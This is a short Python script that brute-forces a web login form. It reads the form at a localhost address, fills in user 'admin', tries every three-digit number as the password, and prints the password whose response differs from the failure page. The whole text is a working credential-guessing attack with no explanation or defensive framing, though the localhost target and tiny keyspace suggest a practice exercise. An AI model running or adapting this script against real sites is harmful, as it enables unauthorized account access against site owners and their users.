import sys, requests, itertools
from lxml.html import fromstring

def getAllPassword(charset, min, max):
    return (''.join(p) for p in itertools.chain.from_iterable(
        itertools.product(charset, repeat=i) for i in range(min, max+1)
    ))

def send(action, method, input):
    if method == "GET":
        action += "?"
        for i in input:
            action += i + "=" + input[i] + "&"
        with requests.Session() as session:
            resp = session.get(action)
    else:
        with requests.Session() as session:
            resp = session.post(action, data=input)
    return resp

if __name__ == '__main__':
    url = 'http://localhost/index.php'
    with requests.Session() as session:
        resp = session.get(url)
    if resp.status_code == 200:
        html = fromstring(resp.content)
        forms = html.forms
        form = forms[0]
        action = url
        method = form.method
        fields = dict(form.fields)
        fields.update({
            "asdf": "ehhhh"
        })
        resp = send(action, method, fields)
        kaputt = resp.content

        charset = "0123456789"
        min = 3
        max = 3
        wordlist = list(getAllPassword(charset, min, max))

        for w in wordlist:
            fields.update({
                "user": "admin",
                "password": w
            })
            resp = send(action, method, fields)
            if not(kaputt in resp.content):
                print("Passwort ist:", w)
